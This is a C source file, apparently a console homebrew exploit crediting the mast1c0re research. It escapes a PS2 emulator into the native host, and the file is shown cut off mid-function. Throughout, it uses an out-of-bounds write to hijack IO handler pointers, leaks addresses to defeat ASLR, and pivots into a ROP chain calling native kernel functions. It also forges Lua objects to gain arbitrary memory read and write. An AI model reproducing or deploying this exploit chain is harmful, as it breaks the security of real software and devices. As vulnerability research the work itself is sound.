/*
    Copyright (C) 2026 Gezine
    
    This software may be modified and distributed under the terms
    of the MIT license.  See the LICENSE file for details.
*/

// Credits
// CTurt           https://cturt.github.io/mast1c0re.html
// McCaulay        https://mccaulay.co.uk/mast1c0re-part-2-arbitrary-ps2-code-execution/
// ChampionLeake   https://www.psdevwiki.com/ps2/Vulnerabilities

#include <tamtypes.h>

#define PS2_MAX_THREADS                255
#define PS2_SYS_GET_THREAD_ID          0x002F5A90
#define PS2_SYS_TERMINATE_THREAD       0x002F59F0
#define PS2_SYS_DELETE_THREAD          0x002F59B0

#define BREAKOUT_BUSY_TIMEOUT          100000

#define NCMD_COMMAND                   0x1f402004
#define NCMD_STATUS                    0x1f402005
#define NCMD_SEND                      0x1f402005
#define SCMD_COMMAND                   0x1f402016
#define SCMD_STATUS                    0x1f402017
#define SCMD_SEND                      0x1f402017
#define SCMD_RECV                      0x1f402018

#define CMD_STATUS_EMPTY               0x40
#define CMD_STATUS_BUSY                0x80

#define N_STATUS_BUFFER                0x3A2448  // unk_3A2408 + 0x40
#define S_STATUS_BUFFER                0x3A2458
#define N_STATUS_INDEX                 0x3A24C8
#define S_STATUS_INDEX                 0x3A24D8

#define IO_REGISTER_READ_HANDLERS      0x5BFB1A0
#define INTERRUPT_WRITE_HANDLERS       0x5F29C8
#define PARTIAL_POINTER_OVERWRITE_RET  0x31

#define PS2_TO_NATIVE(address)         ((u64)(u32)(address) | 0x8000000000ULL)

// PS2 syscall function pointers
typedef int (*f_get_thread_id)();
typedef int (*f_terminate_thread)(int thread_id);
typedef int (*f_delete_thread)(int thread_id);

static f_get_thread_id get_thread_id = (f_get_thread_id)PS2_SYS_GET_THREAD_ID;
static f_terminate_thread terminate_thread = (f_terminate_thread)PS2_SYS_TERMINATE_THREAD;
static f_delete_thread delete_thread = (f_delete_thread)PS2_SYS_DELETE_THREAD;

// eboot offsets
static u64 READ_HANDLER = 0x16c700;
static u64 ADD_EAX_ESP_RET = 0xF1114;
static u64 POP_RSP_RET = 0x61a70;
static u64 MOV_EAX_DOUBLE_DEREF = 0x239a64;
static u64 RET = 0x72;
static u64 POP_RAX_RET = 0xb50a0;
static u64 POP_RBX_RET = 0xc234;
static u64 POP_RCX_RET = 0x96059;
static u64 POP_RDI_RET = 0x1429;
static u64 POP_RSI_RET = 0xbf2b0;
static u64 POP_RDX_RET = 0xbf5b7;
static u64 POP_RBP_RET = 0x8f;
static u64 POP_R13_RET = 0xbf35d;
static u64 POP_R14_RET = 0x11d0e2;
static u64 POP_R15_RET = 0x1428;
static u64 MOV_DEREF_RDI_RAX_RET = 0x75b6c; // mov qword [rdi], rax ; ret ;
static u64 MOV_RAX_DEREF_RAX_RET = 0x23ac20; // mov rax, qword [rax] ; ret ;
static u64 PIVOT_GADGET2 = 0x2e3aac; // pop rsi ; or al, 0xED ; jmp qword [rdi+0x0C] ;
//static u64 LUA_PIVOT1 = 0x133ed2; // mov rax, qword [rdi] ; jmp qword [rax+0x00000100] ;
static u64 LUA_PIVOT1 = 0x1b8640; // mov rax, qword [rdi] ; jmp qword [rax+0x20] ;
static u64 LUA_PIVOT_SCRATCH = 0x5C00000;
static u64 DIALOG_SCRATCH = 0x3C00000;
// scratch buffer in eboot for lua arw
static u64 fake_string_offset = 0x393350;   // TString for arbitrary read
static u64 fake_table_offset = 0x393450;    // addrof

// libc offsets
static u64 PIVOT_GADGET1 = 0x5a070; // mov rax, qword [rax-0x18] ; mov rdi, qword [rbx+rax+0x40] ; mov rax, qword [rdi] ; mov rax, qword [rax+0x70] ; call rax
static u64 PIVOT_GADGET3 = 0x5453b; // mov rsp, qword [rdi+0xF8] ; mov rcx, qword [rdi+0xE0] ; push rcx ; mov rdi, qword [rdi+0x48] ; ret

// functions
static u64 sceKernelOpen = 0;
static u64 sceKernelRead = 0;
static u64 sceKernelWrite = 0;
static u64 sceKernelClose = 0;
static u64 sceKernelStat = 0;
static u64 sceMsgDialogInitialize = 0;
static u64 sceMsgDialogOpen = 0;
static u64 sceMsgDialogTerminate = 0;
static u64 sceCommonDialogInitialize = 0;
static u64 sceCommonDialogTerminate = 0;
static u64 sceKernelUsleep = 0;
static u64 sceUserServiceGetInitialUser = 0;
static u64 sceSaveDataMount = 0;

// lua
static u64 lua_newstate = 0x188C90;
static u64 lua_allocator = 0x1954F0;
static u64 lua_requiref = 0x194590;
static u64 lua_loadfile = 0x1931A0;
static u64 lua_pcall = 0x17B4B0;

static u64 lua_pushlstring = 0x189800;
static u64 lua_newtable = 0x18A050;
static u64 lua_settable = 0x18C970;
static u64 lua_setglobal = 0x17AF80;
static u64 lua_gettable = 0x17A070;

static u64 lualib__G = 0x19D590;
static u64 lualib_package = 0x1B1650;
static u64 lualib_coroutine = 0x1A0110;
static u64 lualib_table = 0x1B0070;
static u64 lualib_io = 0x1A3E30;
static u64 lualib_os = 0x1A8C40;
static u64 lualib_string = 0x1AA030;
static u64 lualib_math = 0x1A7AF0;
static u64 lualib_utf8 = 0x19C7D0;
static u64 lualib_debug = 0x1A1020;

#define LUA_TNIL           0x00
#define LUA_TNUMINT        0x13
#define LUA_TLNGSTR        0x14
#define LUA_TLCF           0x16
#define LUA_TTABLE         0x45
#define LUA_TLNGSTR_GC     0x54

#define L_TOP_OFFSET       0x10  // lua_State->top offset

static u32 n_status_index = 0;

static u32 eboot_base = 0;
static u64 libc_base = 0;
static u64 fios_base = 0;

static u64 stack_pointer = 0;
static u64 saved_rbp = 0;

static u64 return_value = 0;

static u32 user_id = 0;

// ============================================================================

void kill_threads()
{
    int tid = get_thread_id();
    
    for (int i = 1; i < PS2_MAX_THREADS; i++)
    {
        if (i != tid)
        {
            terminate_thread(i);
            delete_thread(i);
        }
    }
}

void reset_s_status_index() {
    *(volatile u8*)SCMD_COMMAND = 0;
    
    int i = 0;
    while ((*(volatile u8*)SCMD_STATUS) & CMD_STATUS_BUSY) {
        if (++i > BREAKOUT_BUSY_TIMEOUT)
            break;
    }
    
    i = 0;
    while (!((*(volatile u8*)SCMD_STATUS) & CMD_STATUS_EMPTY)) {
        volatile u8 recv = *(volatile u8*)SCMD_RECV;
        (void)recv;
        if (++i > BREAKOUT_BUSY_TIMEOUT)
            break;
    }
}

void reset_n_status_index() {
    *(volatile u8*)NCMD_COMMAND = 0;
    
    int i = 0;
    while ((*(volatile u8*)NCMD_STATUS) & CMD_STATUS_BUSY) {
        if (++i > BREAKOUT_BUSY_TIMEOUT)
            break;
    }
    
    n_status_index = 0;
}

void s_status_buffer_overflow(u8* overflow, u32 size) {
    reset_s_status_index();
    
    // Fill 16-byte buffer
    for (int i = 0; i < 0x10; i++)
        *(volatile u8*)SCMD_SEND = 0;
    
    // Write out-of-bounds
    for (u32 i = 0; i < size; i++)
        *(volatile u8*)SCMD_SEND = overflow[i];
}

void set_oob_index(u32 index) {
    if (n_status_index == index)
        return;
    
    reset_n_status_index();
    
    u8 overflow[0x60 + 4] = {0};
    
    // Overwrite gNStatusIndex
    overflow[0x60 + 0] = index >> 0;
    overflow[0x60 + 1] = index >> 8;
    overflow[0x60 + 2] = index >> 16;
    overflow[0x60 + 3] = index >> 24;
    
    n_status_index = index;
    
    s_status_buffer_overflow(overflow, sizeof(overflow));
}

// ============================================================================

void write_oob8(u32 offset, u8 value) {
    set_oob_index(offset - N_STATUS_BUFFER);
    *(volatile u8*)NCMD_SEND = value;
    n_status_index++;
}

void write_oob16(u32 offset, u16 value) {
    write_oob8(offset + 0, (u8)(value >> 0));
    write_oob8(offset + 1, (u8)(value >> 8));
}

void write_oob32(u32 offset, u32 value) {
    write_oob8(offset + 0, (u8)(value >> 0));
    write_oob8(offset + 1, (u8)(value >> 8));
    write_oob8(offset + 2, (u8)(value >> 16));
    write_oob8(offset + 3, (u8)(value >> 24));
}

void write_oob64(u32 offset, u64 value) {
    write_oob32(offset + 0, (u32)value);
    write_oob32(offset + 4, (u32)(value >> 32));
}

// ============================================================================

// Arbitrary read via double-dereference gadget
// mov rax, qword [rax+0x40] ; mov eax, [rax+0x8BC] ; ret
u32 read32_unstable(u64 target_addr) {
    // Write full 64-bit address (target - 0x8BC) at offset +0x40
    write_oob64(IO_REGISTER_READ_HANDLERS + 0x40, target_addr - 0x8BC);
    
    // Trigger gadget: 
    // RAX = [RAX+0x40] = full 64-bit (target - 0x8BC)
    // EAX = [RAX+0x8BC] = [target]
    write_oob64(IO_REGISTER_READ_HANDLERS, MOV_EAX_DOUBLE_DEREF);
    
    volatile u32* io = (volatile u32*)0x10000000;
    u32 retval = *io;
    
    //Restore
    write_oob64(IO_REGISTER_READ_HANDLERS + 0x40, READ_HANDLER);
    write_oob64(IO_REGISTER_READ_HANDLERS, READ_HANDLER);
    
    return retval;
}

u64 read64_unstable(u64 target_addr) {
    u32 low = read32_unstable(target_addr);
    u32 high = read32_unstable(target_addr + 4);
    return ((u64)high << 32) | low;
}

// ============================================================================

u64 leak_eboot() {
    // Corrupt LSB from 0x00 to 0x31 to point to RET instruction
    // This returns the IO handler address in EAX
    volatile u32* io = (volatile u32*)0x10000000;
    write_oob8(IO_REGISTER_READ_HANDLERS, (u8)PARTIAL_POINTER_OVERWRITE_RET);
    u32 io_function_pointer_address = *io;
    
    // Calculate ASLR slide (eboot_base)
    return (u64)io_function_pointer_address - IO_REGISTER_READ_HANDLERS;
}

u64 leak_stack() {
    // add eax, esp ; ret
    // EAX initially contains IO_REGISTER_READ_HANDLERS address
    // After gadget: EAX = IO_REGISTER_READ_HANDLERS + ESP
    write_oob64(IO_REGISTER_READ_HANDLERS, ADD_EAX_ESP_RET);
    
    volatile u32* io = (volatile u32*)0x10000000;
    u32 result = *io;
    u32 base = (u32)(eboot_base + IO_REGISTER_READ_HANDLERS);
    u32 esp = result - base;
    
    //Restore
    write_oob64(IO_REGISTER_READ_HANDLERS, READ_HANDLER);
    
    // RSP is always in 0x700000000 range
    return (u64)esp | 0x700000000ULL;
}

// ============================================================================

void init_eboot_offsets() {
    eboot_base = leak_eboot();
    
    READ_HANDLER += eboot_base;
    ADD_EAX_ESP_RET += eboot_base;
    POP_RSP_RET += eboot_base;
    MOV_EAX_DOUBLE_DEREF += eboot_base;
    RET += eboot_base;
    POP_RAX_RET += eboot_base;
    POP_RBX_RET += eboot_base;
    POP_RCX_RET += eboot_base;
    POP_RDI_RET += eboot_base;
    POP_RSI_RET += eboot_base;
    POP_RDX_RET += eboot_base;
    POP_RBP_RET += eboot_base;
    POP_R13_RET += eboot_base;
    POP_R14_RET += eboot_base;
    POP_R15_RET += eboot_base;
    MOV_DEREF_RDI_RAX_RET += eboot_base;
    MOV_RAX_DEREF_RAX_RET += eboot_base;
    PIVOT_GADGET2 += eboot_base;

    LUA_PIVOT1 += eboot_base;
    LUA_PIVOT_SCRATCH += eboot_base;
    DIALOG_SCRATCH += eboot_base;
    
    lua_newstate += eboot_base;
    lua_allocator += eboot_base;
    lua_requiref += eboot_base;
    lua_loadfile += eboot_base;
    lua_pcall += eboot_base; 

    lualib__G += eboot_base;
    lualib_package += eboot_base;
    lualib_coroutine += eboot_base;
    lualib_table += eboot_base;
    lualib_io += eboot_base;
    lualib_os += eboot_base;
    lualib_string += eboot_base;
    lualib_math += eboot_base;
    lualib_utf8 += eboot_base;
    lualib_debug += eboot_base;

    lua_pushlstring += eboot_base;
    lua_newtable += eboot_base;
    lua_settable += eboot_base;
    lua_setglobal += eboot_base;
    lua_gettable += eboot_base;

    fake_string_offset += eboot_base;
    fake_table_offset += eboot_base;
    
}

void init_libc_offsets() {
    u64 strlen = read64_unstable(eboot_base + 0x388E18);
    libc_base = strlen - 0x32070;

    PIVOT_GADGET1 += libc_base;
    PIVOT_GADGET3 += libc_base;
}

// ============================================================================

static u64 *rop_chain_buffer = (u64*)0x500000; // PS2 memory scratch
static u64 *rop_chain;
static u8 pivot_structure[512];

void setup_rop() {
    stack_pointer = leak_stack() - 0x100;
    saved_rbp = stack_pointer + 0x18;

    // Zero out entire buffer from PS2 side (makes it writable for native)
    for (int i = 0; i < 0x40000; i++) {
        rop_chain_buffer[i] = 0;
    }

    for (int i = 0; i < 512; i++) {
        pivot_structure[i] = 0;
    }
    
    // Place ROP chain at buffer midpoint to allow stack growth in both directions
    rop_chain = rop_chain_buffer + 0x20000;  // 0x20000 * 8 = 0x100000 byte offset
    
    u64 pivot_struct_native = PS2_TO_NATIVE((u32)pivot_structure);
    u64 rop_chain_native = PS2_TO_NATIVE((u32)rop_chain);
    
    // Setup for PIVOT_GADGET1: writes value that will be read at [rax-0x18]
    // This will make rax point to our pivot structure when PIVOT_GADGET1 executes
    write_oob64(IO_REGISTER_READ_HANDLERS - 0x18, pivot_struct_native - 0x10000040);
    
    // PIVOT_GADGET1: mov rax, [rax-0x18] ; mov rdi, [rbx+rax+0x40] ; mov rax, [rdi] ; mov rax, [rax+0x70] ; call rax
    // After reading [rax-0x18], rax = pivot_struct_native - 0x10000040
    // Then rdi = [rbx + (pivot_struct_native - 0x10000040) + 0x40] where rbx is 0x10000000 or 0x10000010
    // This gives us rdi = [pivot_struct_native + 0x00] or [pivot_struct_native + 0x10]
    *(u64*)(pivot_structure + 0x00) = pivot_struct_native + 0x20;  // For rbx = 0x10000000
    *(u64*)(pivot_structure + 0x10) = pivot_struct_native + 0x20;  // For rbx = 0x10000010
    *(u64*)(pivot_structure + 0x20) = pivot_struct_native + 0x20;  // rdi now points here
    
    // PIVOT_GADGET1 continues: mov rax, [rdi] ; mov rax, [rax+0x70] ; call rax
    // rax = [pivot_struct_native + 0x20] = pivot_struct_native + 0x20
    // rax = [rax+0x70] = [pivot_struct_native + 0x90] = PIVOT_GADGET2
    *(u64*)(pivot_structure + 0x0C + 0x20) = PIVOT_GADGET3;  // Used by PIVOT_GADGET2
    *(u64*)(pivot_structure + 0x70 + 0x20) = PIVOT_GADGET2;  // Will be called by PIVOT_GADGET1
    
    // PIVOT_GADGET2: pop rsi ; or al, 0xED ; jmp [rdi+0x0C]
    // pop rsi removes the return address pushed by PIVOT_GADGET1's call instruction
    // This cleans up the stack before jumping to PIVOT_GADGET3
    // Jumps to [rdi+0x0C] = [pivot_struct_native + 0x2C] = PIVOT_GADGET3
    
    // PIVOT_GADGET3: mov rsp, [rdi+0xF8] ; mov rcx, [rdi+0xE0] ; push rcx ; mov rdi, [rdi+0x48] ; ret
    // This is the actual stack pivot: moves our ROP chain address into RSP
    // Pushes RET instruction address, then returns to execute our ROP chain
    *(u64*)(pivot_structure + 0xE0 + 0x20) = RET;              // Pushed then returned to
    *(u64*)(pivot_structure + 0xF8 + 0x20) = rop_chain_native;  // New stack pointer (ROP chain)
    
    // Set stack pivot gadget
    write_oob64(IO_REGISTER_READ_HANDLERS, PIVOT_GADGET1);
    
}

u64 call_rop_full(u64 address, u64 rax, u64 arg1, u64 arg2, u64 arg3, u64 arg4) {
    int idx = 0;
    // Note : stack must align 16 bytes
    
    // Removed
    //
    // Restore corrupted read handler function pointer
    // rop_chain[idx++] = POP_RAX_RET;
    // rop_chain[idx++] = READ_HANDLER;
    // rop_chain[idx++] = POP_RDI_RET;
    // rop_chain[idx++] = eboot_base + IO_REGISTER_READ_HANDLERS;
    // rop_chain[idx++] = MOV_DEREF_RDI_RAX_RET;
    
    // Setup function arguments
    rop_chain[idx++] = POP_RAX_RET;
    rop_chain[idx++] = rax;
    rop_chain[idx++] = POP_RDI_RET;
    rop_chain[idx++] = arg1;
    rop_chain[idx++] = POP_RSI_RET;
    rop_chain[idx++] = arg2;
    rop_chain[idx++] = POP_RDX_RET;
    rop_chain[idx++] = arg3;
    rop_chain[idx++] = POP_RCX_RET;
    rop_chain[idx++] = arg4;
    
    // Call function
    rop_chain[idx++] = address;
    
    // Save return value
    rop_chain[idx++] = POP_RDI_RET;
    rop_chain[idx++] = PS2_TO_NATIVE((u32)&return_value);
    rop_chain[idx++] = MOV_DEREF_RDI_RAX_RET;
    
    // Restore registers
    rop_chain[idx++] = POP_RBX_RET;
    rop_chain[idx++] = 0x10000000;
    rop_chain[idx++] = POP_R14_RET;
    rop_chain[idx++] = 0x10000000;
    rop_chain[idx++] = POP_R15_RET;
    rop_chain[idx++] = 0x1030000090;
    rop_chain[idx++] = POP_RBP_RET;
    rop_chain[idx++] = saved_rbp;
    rop_chain[idx++] = POP_RSP_RET;
    rop_chain[idx++] = stack_pointer;
    
    // Trigger the pivot
    volatile u32* io = (volatile u32*)0x10000000;
    (void)*io;
    
    return return_value;
}

#define call_rop(addr, ...) call_rop_helper(addr, ##__VA_ARGS__, 0, 0, 0, 0, 0)
#define call_rop_helper(addr, rax, arg1, arg2, arg3, arg4, ...) \
    call_rop_full(addr, rax, arg1, arg2, arg3, arg4)

// ============================================================================

u64 read64(u64 address) {
    return call_rop(MOV_RAX_DEREF_RAX_RET, address);
}

u32 read32(u64 address) {
    return (u32)read64(address);
}

u16 read16(u64 address) {
    return (u16)read64(address);
}

u8 read8(u64 address) {
    return (u8)read64(address);
}

void write64(u64 address, u64 value) {
    call_rop(MOV_DEREF_RDI_RAX_RET, value, address);
}

void write8(u64 address, u8 value) {
    u64 current = read64(address);
    write64(address, (current & ~0xFFULL) | value);
}

void write16(u64 address, u16 value) {
    u64 current = read64(address);
    write64(address, (current & ~0xFFFFULL) | value);
}

void write32(u64 address, u32 value) {
    u64 current = read64(address);
    write64(address, (current & ~0xFFFFFFFFULL) | value);
}

void init_function_offsets() {
    sceKernelOpen                = read64(eboot_base + 0x388FB0);
    sceKernelRead                = read64(eboot_base + 0x388FC0);
    sceKernelWrite               = read64(eboot_base + 0x388FA0);
    sceKernelClose               = read64(eboot_base + 0x388FC0);
    sceKernelStat                = read64(eboot_base + 0x388FD0);
    sceMsgDialogInitialize       = read64(eboot_base + 0x389128);
    sceMsgDialogOpen             = read64(eboot_base + 0x389158);
    sceMsgDialogTerminate        = read64(eboot_base + 0x389418);
    sceCommonDialogInitialize    = read64(eboot_base + 0x389160);
    sceCommonDialogTerminate     = sceCommonDialogInitialize + 0x70;
    sceKernelUsleep              = read64(eboot_base + 0x389640);
    sceUserServiceGetInitialUser = read64(eboot_base + 0x3891D8);
    sceSaveDataMount             = read64(eboot_base + 0x3893F0);
}

void init_fios_offsets() {
    // sceFiosDeallocatePassthruFH
    fios_base = read64(libc_base + 0xCBCD8) - 0xD6A0;
}


// ============================================================================

void u64_to_str(u64 num, char *str) {
    int i = 0;
    
    if (num == 0) {
        str[0] = '0';
        str[1] = '\0';
        return;
    }

    while (num > 0) {
        u64 quotient = 0;
        u64 remainder = 0;

        for (int bit = 63; bit >= 0; bit--) {
            remainder <<= 1;
            if (num & (1ULL << bit)) {
                remainder |= 1;
            }
            if (remainder >= 10) {
                remainder -= 10;
                quotient |= (1ULL << bit);
            }
        }
        
        str[i++] = remainder + '0';
        num = quotient;
    }
    
    str[i] = '\0';

    int start = 0;
    int end = i - 1;
    while (start < end) {
        char temp = str[start];
        str[start] = str[end];
        str[end] = temp;
        start++;
        end--;
    }
}

void u64_to_hex(u64 num, char *str) {
    int i = 2;
    
    str[0] = '0';
    str[1] = 'x';
    
    if (num == 0) {
        str[2] = '0';
        str[3] = '\0';
        return;
    }
    
    while (num > 0) {
        int digit = num & 0xF;
        if (digit < 10) {
            str[i++] = digit + '0';
        } else {
            str[i++] = digit - 10 + 'A';
        }
        num >>= 4;
    }
    
    str[i] = '\0';
    
    int start = 2;
    int end = i - 1;
    while (start < end) {
        char temp = str[start];
        str[start] = str[end];
        str[end] = temp;
        start++;
        end--;
    }
}

void send_notification(const char* text) {
    const u64 notify_buffer_size = 0xc30;
    u8 notify_buffer[0xc30] = {0};
    
    for (int i = 0; i < notify_buffer_size; i++) {
        notify_buffer[i] = 0;
    }
    
    // Setup notification structure
    *(u32*)&notify_buffer[0x0] = 0;           // type
    *(u32*)&notify_buffer[0x28] = 0;          // unk3
    *(u32*)&notify_buffer[0x2c] = 1;          // use_icon_image_uri
    *(u32*)&notify_buffer[0x10] = 0xffffffff; // target_id (-1 as unsigned)
    
    // Write message at offset 0x2D
    int i = 0;
    while (text[i] != '\0' && i < 0x3FE) {
        notify_buffer[0x2D + i] = text[i];
        i++;
    }
    notify_buffer[0x2D + i] = '\0';
    
    // Write icon URI at offset 0x42D
    const char* icon_uri = "cxml://psnotification/tex_icon_system";
    i = 0;
    while (icon_uri[i] != '\0') {
        notify_buffer[0x42D + i] = icon_uri[i];
        i++;
    }
    notify_buffer[0x42D + i] = '\0';
    
    static char dev_path[] = "/dev/notification0";
    
    u64 fd = call_rop(sceKernelOpen, 0, 
                           PS2_TO_NATIVE((u32)dev_path), 
                           0x0001, // O_WRONLY
                           0);

    call_rop(sceKernelWrite, 0,
             fd,
             PS2_TO_NATIVE((u32)notify_buffer),
             notify_buffer_size);

    call_rop(sceKernelClose, 0, fd);
}

void get_userid() {
    call_rop(sceUserServiceGetInitialUser, 0, PS2_TO_NATIVE(&user_id));
}

void show_dialog(const char* message) {
    call_rop(sceMsgDialogTerminate);
    call_rop(sceMsgDialogInitialize);

    // Use eboot scratch space for buffers (32bit address)
    u64 dialog_param_addr = DIALOG_SCRATCH;
    u64 msg_param_addr = DIALOG_SCRATCH + 0x88;
    
    // Zero dialog_param buffer
    for (int i = 0; i < 0x88; i++) {
        write8(dialog_param_addr + i, 0);
    }
    
    // Zero msg_param buffer
    for (int i = 0; i < 0x20; i++) {
        write8(msg_param_addr + i, 0);
    }
    
    // Calculate magic
    // magic calculation does not like 64bit address (?)
    u32 magic = (u32)(0xC0D1A109 + dialog_param_addr);
    
    // Setup dialog_param structure
    write64(dialog_param_addr + 0x00, 0x30);              // baseParam.size
    write32(dialog_param_addr + 0x2C, magic);             // magic
    write64(dialog_param_addr + 0x30, 0x88);              // size
    write32(dialog_param_addr + 0x38, 1);                 // mode
    write64(dialog_param_addr + 0x40, msg_param_addr);    // msg_param pointer
    write32(dialog_param_addr + 0x58, user_id);           // userId
    
    // Setup msg_param structure
    write32(msg_param_addr + 0x00, 0);
    write64(msg_param_addr + 0x08, PS2_TO_NATIVE((u32)message));
    
    u64 msg_ret = call_rop(sceMsgDialogOpen, 0, dialog_param_addr);
    
    if(msg_ret != 0) {
        send_notification("sceMsgDialogOpen failed");
    }
    
}

int mount_savedata_readonly() {
    u8 stat_buffer[256];
    static char savedata_path[] = "/savedata0";
    u8 dir_name_struct[32];
    u8 mount_params[128];
    u8 mount_result[128];
    
    send_notification("Mounting savedata for Lua transition...");
    
    // Wait existing rw mount auto unmounts
    for (int attempt = 0; attempt < 20; attempt++) {
        u64 stat_ret = call_rop(sceKernelStat, 0, 
                               PS2_TO_NATIVE((u32)savedata_path),
                               PS2_TO_NATIVE((u32)stat_buffer));
                               
        if (stat_ret != 0) {
            break;
        }
        call_rop(sceKernelUsleep, 0, 1000000);
    }

    for (int i = 0; i < 32; i++) {
        dir_name_struct[i] = 0;
    }
    
    char save_dir[] = "SLUS-20268";
    for (int i = 0; save_dir[i] != '\0' && i < 31; i++) {
        dir_name_struct[i] = save_dir[i];
    }
    
    for (int i = 0; i < 128; i++) {
        mount_params[i] = 0;
        mount_result[i] = 0;
    }
    
    *(u32*)&mount_params[0x00] = user_id;
    *(u64*)&mount_params[0x08] = 0; 
    *(u64*)&mount_params[0x10] = PS2_TO_NATIVE((u32)dir_name_struct);
    *(u64*)&mount_params[0x20] = 32768;
    *(u32*)&mount_params[0x28] = 1; // Read only for permanent mount
    
    for (int attempt = 0; attempt < 10; attempt++) {
        u64 ret = call_rop(sceSaveDataMount, 0,
                        PS2_TO_NATIVE((u32)mount_params),
                        PS2_TO_NATIVE((u32)mount_result));
                               
        if (ret == 0) {
            send_notification("Mounted savedata at /savedata0");
            return 0;
        }
        
        call_rop(sceKernelUsleep, 0, 1000000);
    }
    
    send_notification("Mount failed");
    return -1;
}

// ============================================================================

void lua_push_tvalue(u64 lua_state, u64 value_ptr, u32 type_tag) {
    u64 top = read64(lua_state + L_TOP_OFFSET);
    
    // Write TValue at stack top
    write64(top + 0x00, value_ptr);   // value
    write32(top + 0x08, type_tag);    // tt_
    
    // Increment stack top (TValue is 16 bytes)
    write64(lua_state + L_TOP_OFFSET, top + 0x10);
}

// Push integer to stack
void lua_push_integer(u64 lua_state, u64 integer_value) {
    lua_push_tvalue(lua_state, integer_value, LUA_TNUMINT);
}

// Create and push a fake long string for arbitrary read
u64 create_fake_string() {
    u64 fake_string_addr = fake_string_offset;
    
    write64(fake_string_addr + 0x00, 0);                      // next = NULL
    write8(fake_string_addr + 0x08, 0x14);                    // tt = LUA_TLNGSTR
    write8(fake_string_addr + 0x09, 0);                       // marked = 0
    write8(fake_string_addr + 0x0A, 0);                       // extra = 0
    write8(fake_string_addr + 0x0B, 0xFF);                    // shrlen = 0xFF
    write32(fake_string_addr + 0x0C, 0);                      // hash = 0
    write64(fake_string_addr + 0x10, 0x7FFFFFFFFFFFFFFF);  // lnglen = max
    
    return fake_string_addr;
}

void lua_pushcclosure(u64 lua_state, u64 fn) {
    u64 top = read64(lua_state + L_TOP_OFFSET);
    
    write64(top + 0x00, fn);           // Function pointer
    write32(top + 0x08, LUA_TLCF);     // Type = 0x16
    write32(top + 0x0C, 0);            // Extra = 0
    
    write64(lua_state + L_TOP_OFFSET, top + 0x10);
}

void setup_lua_primitives(u64 lua_state) {    
    // Create fake string for arbitrary read
    u64 fake_string_addr = create_fake_string();
    u64 string_data_base = fake_string_addr + 0x20;  // Data at +0x20
    
    // Push fake string to Lua stack
    lua_push_tvalue(lua_state, fake_string_addr, LUA_TLNGSTR_GC);
    
    // Set as global "FAKE_STRING"
    static char mem_name[] = "FAKE_STRING";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)mem_name));
    
    // Create ADDROF_TABLE table for addrof    
    u64 addrof_table = call_rop(lua_newtable, 0, lua_state);
    
    if (addrof_table == 0) {
        send_notification("ERROR: lua_newtable failed");
        return;
    }
    
    // Setup ADDROF_TABLE's array in our buffer
    u64 array_addr = fake_table_offset;
    u64 array_size = 8;
    
    // Initialize array (all nil TValues)
    for (u64 i = 0; i < array_size; i++) {
        write64(array_addr + (i * 16) + 0x00, 0);
        write32(array_addr + (i * 16) + 0x08, LUA_TNIL);
        write32(array_addr + (i * 16) + 0x0C, 0);
    }
    
    // Patch ADDROF_TABLE's structure
    write32(addrof_table + 0x0C, array_size);
    write64(addrof_table + 0x10, array_addr);
    
    // Push and set as global
    lua_push_tvalue(lua_state, addrof_table, LUA_TTABLE);
    static char addrof_table_name[] = "ADDROF_TABLE";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)addrof_table_name));
    
    // Create WRITE_TABLE Table
    u64 write_table = call_rop(lua_newtable, 0, lua_state);
    if (write_table == 0) {
        send_notification("ERROR: WRITE_TABLE creation failed");
        return;
    }
    
    // Set WRITE_TABLE's array to point to ADDROF_TABLE's structure
    // WRITE_TABLE[2] will write to ADDROF_TABLE+0x10 (array pointer)
    write32(write_table + 0x0C, 8);              // sizearray = 8
    write64(write_table + 0x10, addrof_table);  // array points to ADDROF_TABLE
    
    // Push and set as global
    lua_push_tvalue(lua_state, write_table, LUA_TTABLE);
    static char write_table_name[] = "WRITE_TABLE";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)write_table_name));
    
    // Push ROP pivot gadget for lua using lua_pushcclosure
    lua_pushcclosure(lua_state, LUA_PIVOT1);
    static char lua_rop_funcname[] = "call_rop_internal";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)lua_rop_funcname));
    
    // Export constants to lua
    // ARRAY_ADDR
    lua_push_integer(lua_state, array_addr);
    static char array_addr_name[] = "ARRAY_ADDR";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)array_addr_name));
    
    // STRING_BASE
    lua_push_integer(lua_state, string_data_base);
    static char string_base_name[] = "STRING_BASE";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)string_base_name));
    
    // EBOOT_BASE
    lua_push_integer(lua_state, eboot_base);
    static char eboot_base_name[] = "EBOOT_BASE";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)eboot_base_name));
    
    // LIBC_BASE
    lua_push_integer(lua_state, libc_base);
    static char libc_base_name[] = "LIBC_BASE";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)libc_base_name));

    // FIOS_BASE
    lua_push_integer(lua_state, fios_base);
    static char fios_base_name[] = "FIOS_BASE";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)fios_base_name));

    // LUA_STATE
    lua_push_integer(lua_state, lua_state);
    static char lua_state_name[] = "LUA_STATE";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)lua_state_name));
    
    // USER_ID
    lua_push_integer(lua_state, (u64)user_id);
    static char user_id_name[] = "USER_ID";
    call_rop(lua_setglobal, 0, lua_state, PS2_TO_NATIVE((u32)user_id_name));
    
}

void initialize_lua() {
    static char script_path[] = "/savedata0/lua/init.lua";
    
    u64 lua_state = call_rop(lua_newstate, 0, lua_allocator, 0);
    
    if (lua_state == 0) {
        send_notification("Failed to create Lua state");
        return;
    }
    
    // Load Lua libraries
    // lua_requiref here is not exact lua_requiref but does similar thing
    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"_G"), lualib__G, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"package"), lualib_package, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
    call_rop(lua_requiref, 0, lua_state, PS2_TO_NATIVE((u32)"coroutine"), lualib_coroutine, 1);
    write64(lua_state + 0x10, read64(lua_state + 0x10) - 0x10);
    
